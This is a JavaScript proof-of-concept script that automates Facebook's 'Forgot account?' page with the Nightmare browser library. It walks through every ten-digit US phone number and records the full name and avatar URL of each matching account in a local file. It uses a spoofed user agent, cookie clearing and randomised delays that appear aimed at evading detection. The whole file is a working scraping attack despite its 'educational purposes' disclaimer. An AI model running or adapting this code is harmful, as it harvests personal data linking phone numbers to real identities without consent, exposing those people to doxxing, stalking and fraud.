/**
 * Created by Henrikh Kantuni and Shahen Kosyan on 11/19/16.
 */


'use strict';

const Nightmare = require('nightmare');
const Promise = require('bluebird');
const fs = require('fs');

require('./helpers');

const browser = Nightmare({show: true})
  .useragent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14')
  .viewport(1366, 768);


/**
 * Find an account with the given phone number via "Forgot account?"
 * @param number: {Number} phone number
 * @return {Object} account
 */
function findAccount(number) {
  return new Promise((resolve, reject) => {
    browser
      .cookies.clearAll()
      .goto('https://www.facebook.com/')
      .wait()
      .wait(Math._random(1000, 2000))
      .click('.login_form_label_field a')
      .wait()
      .wait(Math._random(2000, 3000))
      .type('#identify_email', number)
      .click('input[value="Search"]')
      .wait()
      .wait(Math._random(2000, 3000))
      .evaluate((number) => {
        let results = document.querySelectorAll('.fsl.fwb.fcb'), name, avatar;

        if (results.length && results[0].innerHTML.trim().toLowerCase() !== 'no search results') {
          // get name
          name = Array.prototype.map.call(results, (element) => {
            return element.innerHTML.trim();
          }).join(', ');

          // get avatar url
          avatar = document.querySelectorAll('img._s0._rw');
          if (avatar.length) {
            avatar = Array.prototype.map.call(avatar, (element) => {
              return element.src;
            }).join(', ');
          }
        }

        return {
          avatar: avatar,
          name: name,
          number: number
        };
      }, number)
      .run((error, result) => {
        if (error) {
          console.error(error);
          reject(error);
        }
        resolve(result);
      });
  });
}


/**
 * Find accounts and store them in a file.
 */
function findFriends() {
  let countryCode = '+1';
  let start = 0, end = 9999999999;

  Promise.coroutine(function*() {
    for (let i = start; i <= end; ++i) {
      console.log(countryCode + (i).zfill(10));

      let result = yield findAccount(countryCode + i.zfill(10));
      if (result.name) {
        console.log(result);
        // save data to the file
        let stream = fs.createWriteStream('data.txt', {'flags': 'a'});
        stream.once('open', () => {
          stream.write('Full Name: ' + result.name + '\n');
          stream.write('Phone Number: ' + result.number + '\n');
          stream.write('Avatar: ' + result.avatar + '\n\n');
          stream.end();
        });
      }
    }

    yield browser.end();
  })();
}

// This is a Proof of Concept.
// The information provided here is for educational purposes only.
findFriends();
